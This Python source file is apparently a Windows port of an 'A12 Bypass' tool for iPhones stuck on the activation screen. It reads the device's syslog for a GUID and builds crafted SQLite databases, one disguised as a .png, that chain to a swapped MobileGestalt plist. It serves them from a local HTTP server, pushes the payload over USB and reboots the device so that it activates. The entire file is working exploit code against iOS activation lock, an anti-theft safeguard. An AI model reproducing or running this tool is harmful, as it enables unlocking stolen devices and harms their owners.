"""
A12 Bypass OSS - Windows client (32-bit compatible)
Ported from client/activator.py + offline_bypass.py.

macOS-only tools replaced with pure-Python equivalents:
  ideviceinfo          -> pymobiledevice3 lockdown API
  /usr/bin/log (macOS) -> pymobiledevice3 SyslogService (live stream)
  ifuse (mount)        -> pymobiledevice3 AfcService
  curl                 -> requests

Includes the OFFLINE payload generator (port of offline_bypass.py)
so no PHP server is required. Server mode is also kept as an option.
"""
import asyncio
import atexit
import binascii
import os
import re
import shutil
import socket
import sqlite3
import sys
import tempfile
import threading
import time
import zipfile
from http.server import SimpleHTTPRequestHandler
from pathlib import Path
from socketserver import TCPServer

import requests

from pymobiledevice3.lockdown import create_using_usbmux
from pymobiledevice3.services.afc import AfcService
from pymobiledevice3.services.diagnostics import DiagnosticsService
from pymobiledevice3.services.syslog import SyslogService

from payload_templates import BL_STRUCTURE_SQL, DOWNLOADS_STRUCTURE_SQL

# ---------------------------------------------------------------- config ---

SERVER_URL_PLACEHOLDER = "https://your-domain.com/index.php"
PAYLOAD_TARGET = "/Downloads/downloads.28.sqlitedb"
SYLOG_COLLECT_SECONDS = 180  # same window as the original script


def app_dir() -> Path:
    """Directory of the frozen .exe (or of this script when run from source)."""
    if getattr(sys, "frozen", False):
        return Path(sys.executable).parent
    return Path(__file__).resolve().parent


def find_assets_root() -> Path:
    """Locate the Maker assets folder (bundled next to the exe, or repo layout)."""
    here = app_dir()
    for candidate in (here / "assets", here / "server" / "assets", here.parent / "server" / "assets"):
        if (candidate / "Maker").is_dir():
            return candidate
    return here / "assets"


def enable_ansi():
    os.system("")  # quick enable on modern Windows terminals
    if os.name == "nt":
        try:
            import ctypes
            k32 = ctypes.windll.kernel32
            h = k32.GetStdHandle(-11)
            mode = ctypes.c_uint32()
            if k32.GetConsoleMode(h, ctypes.byref(mode)):
                k32.SetConsoleMode(h, mode.value | 0x0004)
        except Exception:
            pass


class Style:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RED = "\033[0;31m"
    GREEN = "\033[0;32m"
    YELLOW = "\033[1;33m"
    BLUE = "\033[0;34m"
    MAGENTA = "\033[0;35m"
    CYAN = "\033[0;36m"


def clear():
    os.system("cls" if os.name == "nt" else "clear")


# ------------------------------------------------------- local HTTP server ---

class LocalServer:
    """Serves generated payloads to the device over Wi-Fi (port of offline_bypass.py)."""

    def __init__(self, port=8080):
        self.port = port
        self.serve_dir = tempfile.mkdtemp(prefix="ios_activation_")
        self.local_ip = self.get_local_ip()
        self.thread = None
        self.httpd = None

    @staticmethod
    def get_local_ip():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    def start(self):
        os.chdir(self.serve_dir)
        handler = SimpleHTTPRequestHandler
        self.httpd = TCPServer(("", self.port), handler)
        self.thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)
        self.thread.start()
        print(f"{Style.DIM}  Local server running at http://{self.local_ip}:{self.port}{Style.RESET}")

    def stop(self):
        if self.httpd:
            self.httpd.shutdown()
            self.httpd.server_close()
            self.httpd = None
        try:
            shutil.rmtree(self.serve_dir, ignore_errors=True)
        except Exception:
            pass

    def get_file_url(self, filename):
        return f"http://{self.local_ip}:{self.port}/{filename}"


# --------------------------------------------------- payload generator -------

class PayloadGenerator:
    """Port of PayloadGenerator from offline_bypass.py (no PHP server needed)."""

    def __init__(self, server_root, asset_root):
        self.server_root = Path(server_root)
        self.asset_root = Path(asset_root)

    @staticmethod
    def _create_db_from_sql(sql_content, output_path):
        try:
            def unistr_sub(match):
                content = match.group(1)
                decoded = re.sub(
                    r"\\([0-9A-Fa-f]{4})",
                    lambda m: binascii.unhexlify(m.group(1)).decode("utf-16-be"),
                    content,
                )
                return f"'{decoded}'"

            sql_content = re.sub(r"unistr\s*\(\s*'([^']*)'\s*\)", unistr_sub, sql_content, flags=re.IGNORECASE)
            sql_content = re.sub(r"unistr\s*\(\s*('[^']*')\s*\)", r"\1", sql_content, flags=re.IGNORECASE)

            output_path = Path(output_path)
            if output_path.exists():
                output_path.unlink()

            conn = sqlite3.connect(str(output_path))
            conn.executescript(sql_content)
            conn.commit()
            conn.close()
            return True
        except Exception as e:
            print(f"{Style.RED}DB generation error: {e}{Style.RESET}")
            return False

    def generate(self, prd, guid, sn, local_server):
        prd_safe = prd.replace(",", "-")

        # 1. Locate MobileGestalt plist for this device
        plist_path = self.asset_root / "Maker" / prd_safe / "com.apple.MobileGestalt.plist"
        if not plist_path.exists():
            print(f"{Style.RED}[!] Asset missing for '{prd_safe}': {plist_path}{Style.RESET}")
            return None

        # 2. 'fixedfile' = zipped plist with random token name
        token1 = binascii.hexlify(os.urandom(8)).decode()
        fixedfile_name = f"fixedfile_{token1}"
        fixedfile_path = self.server_root / fixedfile_name
        with zipfile.ZipFile(fixedfile_path, "w") as zf:
            zf.write(str(plist_path), "Caches/com.apple.MobileGestalt.plist")
        fixedfile_url = local_server.get_file_url(fixedfile_name)

        # 3. BLDatabase (belliloveu_*.png)
        bl_sql = BL_STRUCTURE_SQL.replace("KEYOOOOOO", fixedfile_url)
        token2 = binascii.hexlify(os.urandom(8)).decode()
        bl_db_name = f"belliloveu_{token2}.png"
        bl_db_path = self.server_root / bl_db_name
        if not self._create_db_from_sql(bl_sql, bl_db_path):
            return None
        bl_url = local_server.get_file_url(bl_db_name)

        # 4. Final downloads DB with GUID injected
        dl_sql = DOWNLOADS_STRUCTURE_SQL.replace("https://google.com", bl_url)
        dl_sql = dl_sql.replace("GOODKEY", guid)
        token3 = binascii.hexlify(os.urandom(8)).decode()
        final_db_path = self.server_root / f"downloads_{token3}.sqlitedb"
        if not self._create_db_from_sql(dl_sql, final_db_path):
            return None

        return final_db_path


# ------------------------------------------------------- main automation -----

class BypassAutomation:
    def __init__(self):
        self.lockdown = None
        self.device_info = {}
        self.guid = None
        self.api_url = SERVER_URL_PLACEHOLDER
        self.server = LocalServer()
        self.generator = PayloadGenerator(self.server.serve_dir, find_assets_root())
        atexit.register(self._cleanup)

    def log(self, msg, level="info"):
        if level == "info":
            print(f"{Style.GREEN}[+]{Style.RESET} {msg}")
        elif level == "error":
            print(f"{Style.RED}[!]{Style.RESET} {msg}")
        elif level == "warn":
            print(f"{Style.YELLOW}[~]{Style.RESET} {msg}")
        elif level == "step":
            print(f"\n{Style.BOLD}{Style.CYAN}" + "-" * 60 + f"{Style.RESET}")
            print(f"{Style.BOLD}{Style.BLUE}>> {msg}{Style.RESET}")
            print(f"{Style.CYAN}" + "-" * 60 + f"{Style.RESET}")
        elif level == "detail":
            print(f"{Style.DIM}   . {msg}{Style.RESET}")
        elif level == "success":
            print(f"{Style.GREEN}{Style.BOLD}[+ SUCCESS]{Style.RESET} {msg}")

    # -- device ----------------------------------------------------------

    def connect(self):
        self.log("Detecting device (make sure it is connected via USB)...", "step")
        try:
            self.lockdown = create_using_usbmux(autopair=True)
        except Exception as e:
            self.log(f"No device found / not paired: {e}", "error")
            self.log("Install iTunes or 'Apple Devices' from the Microsoft Store for the USB drivers.", "detail")
            return False

        info = {}
        for key in ("ProductType", "ProductVersion", "SerialNumber", "UniqueDeviceID", "ActivationState"):
            try:
                info[key] = self.lockdown.get_value(None, key)
            except Exception:
                info[key] = None
        self.device_info = {k: v for k, v in info.items() if v is not None}

        print(f"\n{Style.BOLD}Device : {self.device_info.get('ProductType', 'Unknown')} "
              f"(iOS {self.device_info.get('ProductVersion', '?')}){Style.RESET}")
        print(f"{Style.BOLD}UDID   : {self.device_info.get('UniqueDeviceID', '?')}{Style.RESET}")
        if self.device_info.get("ActivationState") == "Activated":
            print(f"{Style.YELLOW}Warning: device is already activated.{Style.RESET}")
        return True

    def reboot_device(self):
        self.log("Rebooting device...", "step")
        DiagnosticsService(lockdown=self.lockdown).restart()
        time.sleep(30)

    # -- GUID extraction (replaces macOS 'log show --archive') -----------

    async def _watch_syslog_for_guid(self, lines, deadline):
        service = SyslogService(lockdown=self.lockdown)
        async for line in service.watch():
            if isinstance(line, bytes):
                line = line.decode("utf-8", "replace")
            lines.append(line)
            if time.time() > deadline:
                return

    def get_guid(self):
        self.log(f"Collecting system logs for up to {SYLOG_COLLECT_SECONDS}s "
                 "(keep the device on the Hello/activation screen)...", "step")
        lines = []
        try:
            asyncio.run(self._watch_syslog_for_guid(lines, time.time() + SYLOG_COLLECT_SECONDS))
        except (TimeoutError, KeyboardInterrupt):
            pass
        except Exception as e:
            self.log(f"Syslog stream ended: {e}", "warn")

        guid_re = re.compile(
            r"SystemGroup/([0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-"
            r"[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})/"
        )
        found = None
        for line in lines:
            if "BLDatabaseManager" in line:
                m = guid_re.search(line)
                if m:
                    found = m.group(1).upper()
                    break
        self.log(f"Scanned {len(lines)} log lines.", "detail")
        return found

    # -- payload push ------------------------------------------------------

    def push_payload(self, local_db_path):
        self.log("Uploading payload over USB (AFC)...", "step")
        afc = AfcService(lockdown=self.lockdown)
        try:
            afc.rm(PAYLOAD_TARGET)
        except Exception:
            pass  # file simply did not exist
        afc.push(local_db_path, PAYLOAD_TARGET, progress_bar=False)

    # -- offline mode ------------------------------------------------------

    def run_offline(self):
        self.server.start()
        self.reboot_device()

        self.guid = self.get_guid()
        if not self.guid:
            self.log("Could not find the GUID in the logs.", "error")
            self.log("Let the device sit on the Hello/activation screen and try again.", "detail")
            return False
        self.log(f"GUID: {self.guid}", "success")

        self.log("Generating payload locally (offline mode)...", "step")
        final_db = self.generator.generate(
            self.device_info["ProductType"], self.guid, self.device_info.get("SerialNumber", ""), self.server
        )
        if not final_db:
            self.log("Payload generation failed.", "error")
            return False
        self.log("Payload generated successfully.", "success")

        self.push_payload(final_db)

        self.log("Payload deployed. Rebooting device...", "success")
        DiagnosticsService(lockdown=self.lockdown).restart()

        self.log("Keeping the local server alive for 60s so the device can download assets...", "info")
        time.sleep(60)
        print(f"\n{Style.GREEN}Process complete. The device should activate after the reboot.{Style.RESET}")
        return True

    # -- server mode -------------------------------------------------------

    def run_server_mode(self):
        url = input(f"{Style.YELLOW}Server URL (Enter = {self.api_url}): {Style.RESET}").strip()
        if url:
            self.api_url = url
        if "your-domain.com" in self.api_url:
            self.log("You must first edit the URL where the PHP server is deployed.", "error")
            return False

        self.reboot_device()

        self.guid = self.get_guid()
        if not self.guid:
            self.log("Could not find the GUID in the logs.", "error")
            return False
        self.log(f"GUID: {self.guid}", "success")

        self.log("Requesting payload from server...", "step")
        params = (
            f"prd={self.device_info['ProductType']}"
            f"&guid={self.guid}&sn={self.device_info.get('SerialNumber', '')}"
        )
        resp = requests.get(f"{self.api_url}?{params}", timeout=60)
        download_url = resp.text.strip()
        if not download_url.startswith("http"):
            self.log(f"Server error: {download_url[:200]}", "error")
            return False

        local_db = "downloads.28.sqlitedb"
        self.log("Downloading payload DB...", "detail")
        with requests.get(download_url, stream=True, timeout=300) as r:
            r.raise_for_status()
            with open(local_db, "wb") as f:
                for chunk in r.iter_content(1024 * 256):
                    f.write(chunk)

        conn = sqlite3.connect(local_db)
        ok = conn.execute(
            "SELECT count(*) FROM sqlite_master WHERE type='table' AND name='asset'"
        ).fetchone()[0]
        conn.close()
        if not ok:
            self.log("Invalid payload received (missing 'asset' table).", "error")
            return False

        self.push_payload(local_db)

        self.log("Payload deployed. Rebooting device...", "success")
        DiagnosticsService(lockdown=self.lockdown).restart()
        print(f"\n{Style.GREEN}Process complete. The device should activate after the reboot.{Style.RESET}")
        return True

    # -- entry -------------------------------------------------------------

    def run(self):
        enable_ansi()
        clear()
        print(f"{Style.BOLD}{Style.MAGENTA}A12 Bypass Tool - Windows Edition{Style.RESET}")
        print(f"{Style.DIM}(offline mode included - no PHP server required){Style.RESET}\n")

        if not self.connect():
            return

        if not (self.generator.asset_root / "Maker").is_dir():
            self.log(f"Assets folder not found: {self.generator.asset_root / 'Maker'}", "error")
            self.log("Keep the 'assets' folder next to the .exe file.", "detail")
            return

        input(f"{Style.YELLOW}Press Enter to start...{Style.RESET}")
        try:
            if self.mode_menu() == "1":
                self.run_offline()
            else:
                self.run_server_mode()
        finally:
            self._cleanup()

    @staticmethod
    def mode_menu():
        print(f"\n{Style.BOLD}Select mode:{Style.RESET}")
        print(f"  {Style.CYAN}1{Style.RESET}) Offline (payload generated on this PC, no server)")
        print(f"  {Style.CYAN}2{Style.RESET}) Server mode (PHP backend URL)")
        return input(f"{Style.YELLOW}Choice [1/2]: {Style.RESET}").strip()

    def _cleanup(self):
        try:
            self.server.stop()
        except Exception:
            pass


def main():
    while True:
        try:
            BypassAutomation().run()
        except KeyboardInterrupt:
            print("\nInterrupted.")
        again = input(f"\n{Style.YELLOW}Run again? [y/N]: {Style.RESET}").strip().lower()
        if again != "y":
            break


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(130)
    finally:
        if os.name == "nt" and getattr(sys, "frozen", False):
            try:
                input("\nPress Enter to exit...")
            except Exception:
                pass
